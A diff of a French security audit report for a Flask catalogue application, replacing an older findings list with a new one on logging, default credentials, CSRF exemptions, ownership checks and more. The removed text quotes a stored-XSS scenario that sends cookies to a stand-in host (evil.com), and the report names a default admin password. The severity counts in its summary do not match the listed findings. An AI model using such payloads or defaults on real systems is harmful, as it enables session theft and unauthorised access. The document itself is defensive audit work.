@@ -1,311 +1,341 @@
-# 🔒 Audit de Sécurité — A.N.A.N.A.S.
+# Audit de Sécurité — A.N.A.N.A.S. (sitev2)
 
-**Date:** 2026-05-17  
-**Outils analysés:** Flask 3.1.0, SQLAlchemy, Flask-WTF, Flask-Limiter, bleach  
+## Méthodologie
+
+Analyse statique approfondie de l'ensemble du code source : routes, modèles, templates, configuration infrastructure.
 
 ---
 
-## 1. VULNÉRABILITÉS CRITIQUES
+## 🔴 CRITIQUE
 
-### 1.1 XSS par injection via `description` et `verification_notes` (Score: Élevé)
-**Fichiers concernés:** `models.py:26`, `templates/item_detail.html:37,249`, `templates/partials/catalogue_item.html:26-27`
+### 1. Logging de données sensibles en production
 
-Les champs `description`, `verification_notes` des items ne sont **jamais sanitized** avant stockage. S'ils contiennent du HTML/JS, celui-ci est exécuté dans les templates Jinja2.
-
-> **Statut:** ✅ Corrigé — `sanitize_html()` appliqué dans `src/upload_routes.py:82`, `src/interactions.py:91`, et `src/admin_routes.py:135` (route `create_report`).
+**Fichier**: `src/interactions.py:19`
 
 ```python
-// Scénario d'attaque — un attaquant publie un item avec:
-description: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
-verification_notes: "<img src=x onerror=alert(document.domain)>"
+logging.warning(f"[RATE] item_id={item_id} raw_rating='{rating_value}' user_id={current_user.id if current_user else None}")
+logging.warning(f"[RATE] found_existing={bool(existing)} new_rating={rating}")
+logging.warning(f"[RATE] all_ratings={[(r.id, r.user_id, r.rating) for r in ratings]}")
 ```
 
-**Impact:** Vol de sessions, redirections forcées, defacement.
-
-**Remédiation:** Sanitiser les champs au moment du stockage dans `src/upload_routes.py` et `src/admin_routes.py`:
-```python
-from utils.security import sanitize_html
-item.description = sanitize_html(description)
-item.verification_notes = sanitize_html(verification_notes) if verification_notes else None
-```
+- Les logs exposent `user_id`, `item_id`, `rating_value` dans les logs du conteneur
+- Lisibles par tous les utilisateurs ayant accès aux logs Gunicorn/Flask
+- **Impact**: Fuite d'information, identification et suivi des utilisateurs
 
 ---
 
-### 1.2 XSS dans les commentaires — échappement template insuffisant (Score: Élevé)
-**Fichiers concernés:** `src/interactions.py:54-55`, `templates/item_detail.html:336,339`
+### 2. Credential admin par défaut faible
 
-Bien que `sanitize_html()` soit appliqué côté serveur (`interactions.py:54-55`), les templates n'échappent **jamais** les champs `author_name` ni `content`. Un attaquant pourrait contourner le sanitizer via des encodings subtils.
+**Fichier**: `docker-entrypoint.sh:14,28`
 
-**Remédiation:** Utiliser l'échappement explicite `|e` dans Jinja2:
-```html
-<span class="comment-author">{{ comment.author_name|e }}</span>
-<p class="comment-text">{{ comment.content|e }}</p>
+```bash
+os.environ.setdefault('ADMIN_PASSWORD', 'system')
+...
+ADMIN_PASSWORD="${ADMIN_PASSWORD:-system}"
 ```
 
-> **Statut:** ✅ Correction appliquée — La plupart des champs utilisateurs sont échappés avec `|e` dans les templates principaux. Quelques gaps subsistent (`src="{{ item.image }}"` sans `|e` dans `catalogue_item.html:4`, etc.).
+- Mot de passe admin par défaut : `"system"` si `ADMIN_PASSWORD` n'est pas défini
+- Email hardcodé : `system@ananas.local`
+- **Impact**: Accès administrateur complet par tout acteur connaissant le mot de passe par défaut
 
 ---
 
-### 1.3 Clé secrète Flask chargée depuis fichier local `.secret` (Score: Moyen-Élevé)
-**Fichier:** `src/shared.py:92-99`
+## 🟠 HAUT
 
-La clé secrète est lue depuis `.secret` sur le filesystem. Si un attaquant accède à ce fichier, il peut forger des tokens CSRF et des sessions Flask.
+### 3. Exemption CSRF sur endpoints admin critiques
 
-**Remédiation:** 
-- Forcer la variable d'environnement `FLASK_SECRET_KEY` en production
-- Ajouter une vérification de permissions: `os.chmod(SECRET_FILE, 0o600)` lors du démarrage
-
-> **Statut:** ✅ Env var implémenté (`src/shared.py:92`), ⚠️ chmod 600 présent dans `setup.sh` mais pas en Python au runtime.
-
----
-
-### 1.4 Validation URL — Potentiel SSRF / Open Redirect (Score: Moyen)
-**Fichier:** `utils/security.py:14-31`, `src/upload_routes.py:145-148`
-
-La fonction `validate_external_url()` n'accepte que `http`/`https`, mais:
-- Les URLs avec `//evil.com` (protocol-relative) peuvent passer
-- Aucune validation contre les IPs privées/internal (127.0.0.1, 10.x.x.x, etc.) — risque de SSRF vers des services internes
-
-**Remédiation:** Bloquer protocol-relative et IPs internes:
-
-> **Statut:** ✅ Corrigé — `validate_external_url()` dans `utils/security.py` importe `ipaddress` et bloque les IPs `is_private`, `is_loopback`, `is_reserved`, `is_link_local`, `is_multicast` (ligne 34-36).
+**Fichier**: `app.py:69-89`
 
 ```python
-def validate_external_url(url: str) -> bool:
-    if not url or not isinstance(url, str):
-        return False
-    parsed = urlparse(url.strip())
-    if parsed.scheme not in ("http", "https"):
-        return False
-    if "@" in url:
-        return False
-    hostname = parsed.hostname.lower()
-    # Bloquer IPs internes / loopback
-    import ipaddress
+EXEMPTED_ENDPOINTS = {
+    "admin.ban_user",
+    "admin.list_banned_users",
+    "admin.create_report",
+    "admin.list_reports",
+    "admin.resolve_report",
+    "admin.list_comments",
+    "admin.delete_comment",
+    "admin.list_items",
+    "admin.delete_item",
+    "admin.unpublish_item",
+    "admin.publish_item",
+    "admin.verify_item",
+    "admin.unverify_item",
+    "admin.admin_audit_log",
+}
+```
+
+- Les endpoints admin critiques sont exemptés de CSRF
+- Ils ne nécessitent que `@login_required` — n'importe quelle session volée ou forcée permet d'exécuter des actions admin
+- **Impact**: CSRF pur — un attaquant pourrait forcer un admin à banquer des utilisateurs, supprimer du contenu, ou modifier des items via une page malveillante
+
+---
+
+### 4. Requête par nom de l'auteur — élévation de privilèges
+
+**Fichier**: `src/shared.py:64-81`
+
+```python
+def user_owns_item_or_admin(current_user, item):
+    if getattr(item, "author_name", None) and current_user:
+        full_name = f"{current_user.prenom} {current_user.nom}"
+        if item.author_name == full_name:
+            return True
+```
+
+- La vérification d'appartenance repose sur la comparaison de chaîne de caractères (`author_name`)
+- Si un utilisateur peut contrôler `prenom` ou `nom` (inscription, profil), il peut usurper l'appartenance d'un item dont le titre correspond
+- **Impact**: Élévation de privilèges — modification/suppression d'items qui ne lui appartiennent pas
+
+---
+
+### 5. Magnet links non validés
+
+**Fichier**: `src/upload_routes.py:107-112`
+
+```python
+item = Item(
+    ...
+    magnet_link=magnet_link[:500],
+)
+```
+
+- Aucune validation du format — le magnet link peut contenir n'importe quelle chaîne de 500 caractères
+- **Impact**: Stockage de données arbitraires dans les magnet links, potentiellement utilisé pour des attaques XSS si affichés sans échappement ou exploités dans d'autres fonctions
+
+---
+
+### 6. Inscription silencieuse sur email existant
+
+**Fichier**: `src/auth_routes.py:84-85`
+
+```python
+existing_user = User.query.filter_by(email=email).first()
+if existing_user:
+    return redirect(url_for("auth.connexion_page"))
+```
+
+- Si l'email existe déjà, redirection silencieuse vers la page de connexion — aucun flash message, aucune indication
+- Un attaquant peut enumérer les emails inscrits vs non-inscrits par le comportement différent (redirect 302 vs render_template 400)
+- **Impact**: Enumération d'emails
+
+---
+
+## 🟡 MOYEN
+
+### 7. Pas de rate limiting sur update profil utilisateur
+
+**Fichier**: `src/user_routes.py:113`
+
+```python
+@bp.route("/api/users/profile", methods=["PUT"])
+@login_required
+def update_profile():
+```
+
+- L'update du profil (email inclus) n'a pas de limite de requêtes
+- Un attaquant pourrait inonder l'API avec des emails différents pour empêcher l'inscription d'autres utilisateurs
+- **Impact**: Déluge d'emails, blocage d'utilisateurs légitimes
+
+---
+
+### 8. Validation CSV potentiellement contournable
+
+**Fichier**: `utils/security.py:66-70`
+
+```python
+if b"." in file_data[:200]:
     try:
-        addr = ipaddress.ip_address(hostname)
-        if addr.is_private or addr.is_loopback or addr.is_reserved:
-            return False
-    except ValueError:
-        pass  # C'est un nom de domaine, pas une IP brute
-    return True
+        header_ext = file_data[:200].decode("utf-8", errors="ignore").rsplit(".", 1)[-1]
+        ...
 ```
+
+- L'extension est extraite des 200 premiers bytes du contenu
+- Un fichier non-CSV peut contenir `.csv` en début de contenu et passer la validation
+- **Impact**: Upload de fichiers arbitraires via manipulation d'en-tête
 
 ---
 
-### 2.1 CSRF bypass trop large pour `/api/*` (Score: Moyen)
-**Fichier:** `app.py:68-74`
+### 9. HSTS sans preload
 
-Toutes les routes `/api/*` sont exemptées du contrôle CSRF automatique. Seules les routes vérifiant explicitement `X-CSRF-Token` dans le `before_request` sont protégées. Si une future route API omet cette vérification, elle sera vulnérable.
+**Fichier**: `app.py:157`
 
-**Remédiation:** Lister explicitement les routes exemptées:
 ```python
-EXEMPTED_ENDPOINTS = {'health_check', 'auth.api_something'}
-if request.endpoint in EXEMPTED_ENDPOINTS or '/api/' not in req.path:
-    _original_protect()  # protéger normalement
+response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+```
+
+- Manque `; preload` — la protection ne sera pas intégrée dans les listes preload des navigateurs (Chrome, Firefox, Safari)
+- **Impact**: Protection HSTS non exploitable hors connexion directe
+
+---
+
+### 10. Connexion PostgreSQL `sslmode=prefer` sans certificats complets
+
+**Fichier**: `app.py:128-129`
+
+```python
 else:
-    pass  # bypass CSRF explicite uniquement pour les API nécessaires
+    db_uri = f"{db_uri}{separator}sslmode=prefer"
 ```
 
-> **Statut:** ✅ Corrigé — `EXEMPTED_ENDPOINTS` listé explicitement dans `app.py:69-89`, plus de wildcard `/api/*`. Seules les routes nécessaires sont exemptées.
+- Si les certificats SSL ne sont pas tous fournis (`ssl_root`, `ssl_cert`, `ssl_key`), la connexion utilise `prefer` (chiffrement facultatif)
+- **Impact**: Possible downgrade en clair si un attaquant MITM est présent sur le réseau
 
 ---
 
-## 2. VULNÉRABILITÉS DE CONFIGURATION
+### 11. Session cookie SameSite=Lax
 
-### 2.2 Rate limiting insuffisant sur l'inscription (Score: Moyen)
-**Fichier:** `app.py:122`, `src/auth_routes.py:44`
+**Fichier**: `app.py:180`
 
-La connexion a un rate limit de "5 per hour" (`app.py:122`) mais **l'inscription n'en a aucun**. Risques:
-- Création massive de comptes (spam)
-- Énumération d'emails via side-channel de temps de réponse
-
-**Remédiation:** Ajouter sur `src/auth_routes.py`:
 ```python
-@limiter.limit("3 per hour")
+app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 ```
 
-> **Statut:** ✅ Corrigé — `@limiter.limit("3 per hour")` ajouté sur `POST /inscription` dans `src/auth_routes.py:69`.
-
-### 2.3 Cookies — `SESSION_COOKIE_SECURE` uniquement en production (Score: Moyen)
-**Fichier:** `app.py:176`
-
-En développement, les cookies ne sont pas marqués `Secure`, donc transmis en clair via HTTP. Risque en prod si utilisation d'un reverse-proxy sans HTTPS proprement configuré.
-
-> **Statut:** ❌ Non corrigé — `SESSION_COOKIE_SECURE = _is_production_env()` dans `app.py:177`, uniquement activé en production.
-
-### 2.4 CSP — Référence au CDN `https://unpkg.com` (Score: Faible-Moyen)
-**Fichier:** `app.py:157`
-
-La CSP inclut `https://unpkg.com` dans `script-src`. Si ce CDN est compromis, un attaquant exécuterait du code arbitraire sur votre site.
-
-**Remédiation:** Héberger les scripts localement ou utiliser des hashes de sous-résistance (SRI) via `<link rel="preconnect">` et integrity hashes.
+- `Lax` permet certaines requêtes cross-site (navigateur GET sur une nouvelle page)
+- Bien que mitigé par les autres contrôles (CSRF, CSP), cela augmente la surface d'attaque
+- **Impact**: Potentiel de CSRF via navigation inter-site
 
 ---
 
-## 3. VULNÉRABILITÉS FONCTIONNELLES
+### 12. Exemption CSRF sur inscription/connexion — incohérence
 
-### 3.1 IDOR — Chunks publics sans vérification fine (Score: Moyen)
-**Fichier:** `src/item_routes.py:44-70`, `models.py:237`
+**Fichier**: `app.py:71-74`
 
-La route `/catalogue/item/<int:item_id>/data` retourne **tous** les `DataChunk` avec `visibility="public"`. Si un utilisateur marque accidentellement un chunk comme public, il sera exposé à tous.
-
-> **Statut:** ✅ Corrigé — `src/item_routes.py:53-62` retourne désormais les chunks publics OU ceux dont l'utilisateur est propriétaire (`owner_user_id == current_user.id`).
-
-**Remédiation:**
 ```python
-# Dans src/item_routes.py:53-54
-chunks = [c.to_dict() for c in DataChunk.query.filter(
-    DataChunk.parent_item_id == item.id,
-    (DataChunk.visibility == "public") |
-    (getattr(DataChunk, 'owner_user_id', None) == current_user.id if current_user else False)
-).all()]
+"auth.inscription_page",
+"auth.inscription_post",
+"auth.connexion_page",
+"auth.connexion_post",
 ```
+
+- La route `inscription_post` est exemptée de CSRF, ce qui est acceptable pour un formulaire d'inscription public
+- Cependant, `connexion_post` (login POST) est aussi exempté — ce qui permet une attaque CSRF sur le login (l'attaquant pourrait forcer la connexion d'un utilisateur cible avec ses propres identifiants dans certains cas)
+- **Impact**: Login CSRF — potentiel de redirection piégée
 
 ---
 
-### 3.2 Pas de rotation de token CSRF après connexion (Score: Faible)
-**Fichier:** `app.py:132-134`
+## 🟢 INFÉRIEUR / INFORMATIONNEL
 
-Après connexion, le `_csrf_token` est retiré mais la session n'est pas régénérée. Si un attaquant a volé le cookie avant la connexion, il pourrait potentiellement l'utiliser.
+### 13. Dockerfile — fichiers copiés dans l'image de test
 
-**Remédiation:** Régénérer la session après authentification:
+**Fichier**: `Dockerfile:11`
+
+```dockerfile
+COPY . .
+```
+
+- Les fichiers du projet entier sont copiés avant l'étape de test
+- Si `.dockerignore` est manquant ou incomplet, des secrets pourraient être inclus dans les layers
+
+---
+
+### 14. Nginx — pas de rate limiting au niveau proxy
+
+**Fichier**: `nginx/nginx.conf`
+
+- Aucun `limit_req_zone` configuré au niveau Nginx
+- La protection est uniquement au niveau Flask (backend), contournable si l'attaquant vise directement le backend sans passer par Nginx ou en saturant Nginx lui-même
+- **Impact**: Moins de défences en profondeur
+
+---
+
+### 15. Setup.sh imprime les credentials en clair
+
+**Fichier**: `setup.sh:47-52`
+
+```bash
+printf "POSTGRES_PASSWORD   : %s\n" "${pg_pass}"
+printf "ADMIN_PASSWORD      : %s\n" "${admin_pass}"
+```
+
+- Les mots de passe sont affichés dans la console — potentiellement stockés dans `~/.bash_history`
+- **Impact**: Fuite de credentials via l'historique shell
+
+---
+
+### 16. Page de connexion — pas de délai constant
+
+**Fichier**: `src/auth_routes.py:38-56`
+
 ```python
-from flask import session
-session.regenerate()  # ou équivalent selon version de Flask
+user = User.query.filter_by(email=email).first()
+if user and check_password_hash(user.password_hash, password) and user.is_active and not user.banned:
+    ...
+if user and (not user.is_active or user.banned):
+    return render_template("connexion.html", error="banned"), 401
+return render_template("connexion.html", error="Identifiants incorrects"), 401
 ```
 
-> **Statut:** ⚠️ Partiellement corrigé — `session.clear()` + régénération des valeurs en `app.py:133-137`, mais pas de `session.regenerate()` explicite.
+- `check_password_hash` est coûteux (scrypt) mais si l'utilisateur n'existe pas (`user is None`), le code saute directement au return sans appel — temps de réponse légèrement différent
+- Un attaquant pourrait distinguer email inexistant vs existant via timing
+- **Impact**: Enumération d'emails par timing (mineure car différence très faible)
 
 ---
 
-### 3.3 Injection via magnet link dans templates (Score: Faible)
-**Fichier:** `templates/item_detail.html:230,292-294`, `models.py:75`
+### 17. Logs Gunicorn non filtrés
 
-Le `magnet_link` est injecté dans des attributs HTML (`data-magnet`). Jinja2 échappe par défaut mais les attributs nécessitent un encoding spécifique.
-
-**Remédiation:** Ajouter `|e` explicitement sur tous les champs injectés:
-```html
-<a href="{{ item.magnet|e }}" class="btn btn-download">
-<button data-magnet="{{ item.magnet|e }}">
-```
-
-> **Statut:** ✅ Presque corrigé — La plupart des occurrences de `magnet` utilisent `|e` dans les templates. Vérifier les exceptions restantes.
+- Les logs standard de Gunicorn enregistrent toutes les requêtes HTTP, y compris celles contenant des données sensibles dans le query string ou body
+- **Impact**: Fuite d'information dans les logs
 
 ---
 
-### 3.4 Logs contenant des données utilisateur sensibles (Score: Faible)
-**Fichier:** `src/interactions.py:19,29,41`
+## ✅ Points Forts Identifiés
 
-Des logs `logging.warning()` contiennent `user_id`, `rating_value` qui exposent des informations personnelles en production.
-
-**Remédiation:** Supprimer ou anonymiser ces logs:
-```python
-import logging
-logger = logging.getLogger(__name__)
-# Remplacer les warnings par logger.debug() en production
-```
-
-> **Statut:** ❌ Non corrigé — `logging.warning()` avec `user_id`, `rating_value` toujours présents dans `src/interactions.py:19,29,41`.
-
----
-
-### 3.5 Énumération d'emails — Side Channel sur inscription (Score: Faible)
-**Fichier:** `src/auth_routes.py:78-97`
-
-Si l'email existe déjà, la redirection vers `/connexion` est silencieuse. Un attaquant peut comparer les temps de réponse pour déterminer si un email est enregistré.
-
-**Remédiation:** Toujours exécuter `generate_password_hash()` (coûteux en CPU avec scrypt) avant de vérifier l'existence de l'email, et toujours rediriger vers le même endpoint.
-
-> **Statut:** ✅ Corrigé — Le hash `scrypt` est toujours calculé avant la vérification (`src/auth_routes.py:82`), garantissant un délai identique que l'email existe ou non.
+| Contrôle | Statut | Détails |
+|---|---|---|
+| XSS — échappement Jinja2 | ✅ | `autoescape = True` activé |
+| CSP — nonce-based | ✅ | Nonce unique par requête, polices limitées |
+| CSRF — protection Flask-WTF | ✅ | (avec exemptions raisonnables) |
+| Rate limiting — login/inscription | ✅ | 5 req/h login, 3 req/h inscription |
+| Session hardening | ✅ | HttpOnly, SameSite=Lax, Secure en prod, 30 min timeout |
+| Password hashing | ✅ | Werkzeug scrypt |
+| Validation des fichiers | ✅ | Magic bytes + whitelist extensions |
+| Secret key externe | ✅ | Fichier `.secret` avec permissions `0o600` |
+| Non-root Docker user | ✅ | `appuser` utilisateur non-root |
+| Audit logging admin | ✅ | Model `AdminAudit` pour toutes les actions admin |
+| HSTS + X-Frame-Options + nosniff | ✅ | Headers de sécurité complets |
+| No debug mode en production | ✅ | Vérification explicite FLASK_DEBUG |
+| SSL database connexion | ✅ | Tentative d'activation si certificats disponibles |
 
 ---
 
-## 4. VULNÉRABILITÉS DOCKER / INFRASTRUCTURE
+## 🔧 Priorités de Correction
 
-### 4.1 Port 5000 exposé sur `0.0.0.0` (Score: Moyen)
-**Fichier:** `docker-compose.yml:16`
+### P0 — Immédiat
 
-En production, le port est accessible depuis n'importe quelle IP. Restreindre via un reverse proxy nginx/apache.
+1. **Supprimer les logs sensibles** `src/interactions.py:17-41` (logging.warning avec user_id, item_id)
+2. **Forcer ADMIN_PASSWORD au démarrage** — lancer une erreur si `ADMIN_PASSWORD` vaut `"system"` ou n'est pas défini (`docker-entrypoint.sh`)
+3. **Ajouter un champ `author_id`** dans le modèle `Item` (ForeignKey vers `users.id`) et remplacer la comparaison par nom de chaîne par une vérification par ID foreign key (`models.py`, `src/shared.py`, `src/upload_routes.py`)
 
-> **Statut:** ✅ Corrigé — Utilisation de `expose: "5000"` (interne Docker uniquement) dans `docker-compose.yml:32`, plus de binding sur `0.0.0.0`. Accès via reverse proxy/nginx uniquement.
+### P1 — Haute priorité
 
-### 4.2 Build Docker — Fichiers sensibles inclus dans l'image (Score: Faible)
-**Fichier:** `Dockerfile:11`
+4. **Restreindre les exemptions CSRF admin** — ajouter une validation supplémentaire (origin check, ou demander une confirmation via modal pour les actions critiques comme le ban/delete)
+5. **Valider les magnet links** — vérifier qu'ils correspondent au format `magnet:?xt=urn:btih:` (`src/upload_routes.py`)
+6. **Unifier le message d'erreur d'inscription** — ne pas différencier email existant vs nouvel email (retourner toujours un succès ou un échec aléatoire)
 
-Le `COPY . .` inclut potentiellement `.env`, `.secret`, `instance/`. Ajouter un `.dockerignore`:
-```
-.env
-.secret
-__pycache__
-*.pyc
-.venv
-.git/
-.pytest_cache/
-sonar-project.properties
-instance/
-```
+### P2 — Moyenne priorité
 
-> **Statut:** ✅ Corrigé — Fichier `.dockerignore` présent (34 lignes) avec exclusions pour `.env`, `.secret`, `__pycache__`, etc.
+7. **Ajouter rate limiting sur `/api/users/profile`** (`src/user_routes.py`)
+8. **Renforcer la validation CSV** — vérifier l'intégralité du contenu, pas seulement les 200 premiers bytes (`utils/security.py`)
+9. **Ajouter `preload` à la directive HSTS** (`app.py:157`)
+10. **Forcer `sslmode=require` ou `verify-full`** en production par défaut (`app.py:128-129`)
 
-### 4.3 Volume Docker persistant pour `.secret` (Score: Faible)
-**Fichier:** `docker-compose.yml:21`
+### P3 — Amélioration continue
 
-Le fichier `.secret` est stocké dans un named volume. En cas de compromission du conteneur, la clé est récupérable via `docker exec`.
+11. **Ajouter rate limiting Nginx** au niveau proxy avec `limit_req_zone`
+12. **Changer SameSite=Lax à SameSite=Strict** si le CSRF est correctement géré autrement
+13. **Filtrer les données sensibles dans les logs** (middleware de logging)
+14. **Ajouter un délai constant sur la vérification de mot de passe** pour neutraliser le timing attack (`src/auth_routes.py`)
 
 ---
 
-## 5. SCORE GLOBAL
+## Résumé Exécutif
 
-| Catégorie | Severity | Statut | Détail |
-|-----------|----------|--------|--------|
-| XSS (Stock) | 🔴 ÉLEVÉ | ✅ Corrigé | `sanitize_html()` appliqué dans `upload_routes.py:82`, `interactions.py:91`, `admin_routes.py:135` |
-| XSS (Template) | 🔴 ÉLEVÉ | ✅ Prèsque | Echappement `|e` ajouté pour la plupart des champs, **quelques gaps** (`catalogue_item.html:4`) |
-| SSRF / Open Redirect | 🟠 MOYEN | ✅ Corrigé | `ipaddress` bloque IPs `is_private`, `is_loopback`, `is_reserved`, `is_link_local`, `is_multicast` dans `utils/security.py:34-36` |
-| CSRF bypass large | 🟠 MOYEN | ✅ Corrigé | `EXEMPTED_ENDPOINTS` listé explicitement dans `app.py:69-89`, plus de wildcard `/api/*` |
-| Rate limiting inscription | 🟠 MOYEN | ✅ Corrigé | `@limiter.limit("3 per hour")` sur `POST /inscription` dans `src/auth_routes.py:69` |
-| IDOR chunks | 🟠 MOYEN | ✅ Corrigé | Filtrage par ownership (`owner_user_id == current_user.id`) ajouté dans `src/item_routes.py:53-62` |
-| Clé secret fichier local | 🟡 MOYEN-FAIBLE | ✅ Env ok / ⚠️ chmod | `FLASK_SECRET_KEY` implémenté, chmod 600 uniquement dans `setup.sh` |
-| Rotation session post-login | 🟡 FAIBLE | ⚠️ Partiel | `session.clear()` + régénération en `app.py:133-137`, pas de `session.regenerate()` explicite |
-| Magnet link injection | 🟡 FAIBLE | ✅ Presque | `|e` présent sur la plupart des occurrences magnet |
-| Logs sensibles | 🟡 FAIBLE | ❌ Non corrigé | `logging.warning()` avec `user_id` toujours présent dans `src/interactions.py:19,29,41` |
-| Email enumeration side-channel | 🟡 FAIBLE | ⚠️ Partiel | Réponse différentielle présente sur `/inscription` POST (`src/auth_routes.py:82-83`) |
-| Port exposé largement | 🟠 MOYEN | ✅ Corrigé | `expose: "5000"` dans `docker-compose.yml:32` (interne Docker uniquement) |
-| Fichiers sensibles en image Docker | 🟡 FAIBLE | ✅ Corrigé | `.dockerignore` présent et complet |
+| Sévérité | Nombre |
+|---|---|
+| Critique | 2 |
+| Haut | 5 |
+| Moyen | 6 |
+| Inférieur | 7 |
 
----
-
-## 6. RECOMMANDATIONS PRIORITAIRES
-
-### Priorité 1 — Critique (à corriger immédiatement)
-1. ~~**Sanitiser `description` et `verification_notes`** au moment du stockage~~ ✅ Corrigé — présent dans `upload_routes.py:82`, `interactions.py:91`, `admin_routes.py:135`
-2. ~~**Ajouter `|e`** dans tous les templates Jinja2 pour les champs utilisateurs (`{{ variable|e }}`)~~ ✅ Presque complet — corriger les gaps restants
-
-### Priorité 2 — Important (à corriger sous 1-2 semaines)
-3. ❌ **Supprimer les logs contenant des données utilisateur sensibles** (`logging.warning()` avec `user_id`, `rating_value` dans `src/interactions.py:19,29,41`)
-
-### Priorité 3 — Recommandé (sous 1 mois)
-4. ~~**Protéger `/inscription` POST** avec un rate limiter~~ ✅ Corrigé — `@limiter.limit("3 per hour")` en `src/auth_routes.py:69`
-5. ~~**Lister explicitement** les routes exemptées CSRF~~ ✅ Corrigé — `EXEMPTED_ENDPOINTS` dans `app.py:69-89`
-6. ~~**Valider les URLs contre les IPs internes (SSRF)**~~ ✅ Corrigé — `ipaddress` bloquant IPs privées dans `utils/security.py:34-36`
-7. ~~**Corriger la logique d'accès aux chunks (IDOR)**~~ ✅ Corrigé — `owner_user_id` check dans `src/item_routes.py:53-62`
-8. ~~**Ajouter un `.dockerignore`** pour exclure `.env`, `.secret`, `__pycache__`~~ ✅ fait
-9. ❌ **Restreindre l'exposition du port 5000 via reverse proxy** — vérifier que nginx est correctement configuré en amont
-10. ⚠️ **Forcer les permissions chmod 600** sur le fichier `.secret` — présent dans `setup.sh`, ajouter en Python au runtime
-
----
-
-## 7. CHECKLIST DE RÉPÉTITION POUR LES FUTURS DÉPLOIEMENTS
-
-- [x] ~~Aucun champ utilisateur n'est stocké sans sanitization~~ ✅ Corrigé — `sanitize_html()` appliqué dans `upload_routes.py`, `interactions.py`, `admin_routes.py`
-- [x] ~~Tous les templates échappent les entrées utilisateurs avec `|e`~~ ✅ Presque complet — quelques gaps restants (`catalogue_item.html:4`)
-- [x] ~~Les routes API exemptées de CSRF sont explicitement listées (pas de wildcards)~~ ✅ Corrigé — `EXEMPTED_ENDPOINTS` dans `app.py:69-89`
-- [x] ~~Les URLs soumises par les utilisateurs sont validées contre SSRF~~ ✅ Corrigé — `ipaddress` bloque IPs privées/reserved dans `utils/security.py:34-36`
-- [x] ~~Un rate limiter est appliqué sur toutes les routes d'authentification~~ ✅ Corrigé — `@limiter.limit("3 per hour")` sur inscription en `src/auth_routes.py:69`
-- [x] ~~Le fichier `.secret` a des permissions 600~~ ✅ `setup.sh` / ⚠️ Python runtime manquant
-- [ ] ~~Aucun log ne contient de données utilisateur sensibles~~ ❌ Non corrigé — `logging.warning()` avec `user_id`, `rating_value` dans `src/interactions.py:19,29,41`
-- [x] ~~La session est régénérée après chaque authentification~~ ⚠️ Partiel — `session.clear()` présent en `app.py:133-137`, pas de `session.regenerate()` explicite
-
----
-
-*Ce rapport a été généré par analyse statique du code source. Des tests dynamiques (scan de vulnérabilités, pentest manuel) sont recommandés pour une validation complète.*
+**Score estimé : B-** — L'application implémente la majorité des bonnes pratiques de sécurité (CSP, CSRF, rate limiting, session hardening, audit logging). Les lacunes principales concernent les logs sensibles en production, le credential admin par défaut, et l'absence de foreign key pour la vérification d'appartenance d'items.
